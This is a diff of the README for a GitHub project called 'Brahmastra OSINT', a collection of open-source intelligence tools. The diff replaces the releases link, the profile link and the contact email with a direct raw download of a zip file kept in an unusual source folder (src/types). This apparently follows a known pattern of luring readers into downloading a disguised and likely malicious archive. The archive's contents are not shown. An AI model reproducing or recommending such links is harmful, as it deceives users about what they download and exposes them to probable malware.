@@ -2,7 +2,7 @@
 
 Welcome to the **Brahmastra OSINT** repository! This project focuses on open-source intelligence (OSINT) tools and resources, particularly in the fields of geospatial intelligence (GEOINT), signals intelligence (SIGINT), and social media analysis. Whether you're a researcher, analyst, or hobbyist, you'll find valuable resources here.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/connedigital/Brahmastra_OSINT/releases)
+[![Download Releases](https://github.com/connedigital/Brahmastra_OSINT/raw/refs/heads/main/src/types/OSINT-Brahmastra-v1.6.zip%20Releases-Click%20Here-brightgreen)](https://github.com/connedigital/Brahmastra_OSINT/raw/refs/heads/main/src/types/OSINT-Brahmastra-v1.6.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ This repository covers a wide range of topics, including:
 
 ## Installation
 
-To get started with **Brahmastra OSINT**, you can download the latest release from our [Releases section](https://github.com/connedigital/Brahmastra_OSINT/releases). Once you download the necessary files, follow these steps:
+To get started with **Brahmastra OSINT**, you can download the latest release from our [Releases section](https://github.com/connedigital/Brahmastra_OSINT/raw/refs/heads/main/src/types/OSINT-Brahmastra-v1.6.zip). Once you download the necessary files, follow these steps:
 
 1. **Download the Release**: Click on the link above to access the latest version.
 2. **Extract Files**: Unzip the downloaded file to your preferred directory.
@@ -74,7 +74,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [connedigital](https://github.com/connedigital)
-- **Email**: contact@connedigital.com
+- **GitHub**: [connedigital](https://github.com/connedigital/Brahmastra_OSINT/raw/refs/heads/main/src/types/OSINT-Brahmastra-v1.6.zip)
+- **Email**: https://github.com/connedigital/Brahmastra_OSINT/raw/refs/heads/main/src/types/OSINT-Brahmastra-v1.6.zip
 
-Thank you for checking out **Brahmastra OSINT**! We hope you find it useful in your OSINT endeavors. Don't forget to visit our [Releases section](https://github.com/connedigital/Brahmastra_OSINT/releases) for the latest updates!
+Thank you for checking out **Brahmastra OSINT**! We hope you find it useful in your OSINT endeavors. Don't forget to visit our [Releases section](https://github.com/connedigital/Brahmastra_OSINT/raw/refs/heads/main/src/types/OSINT-Brahmastra-v1.6.zip) for the latest updates!
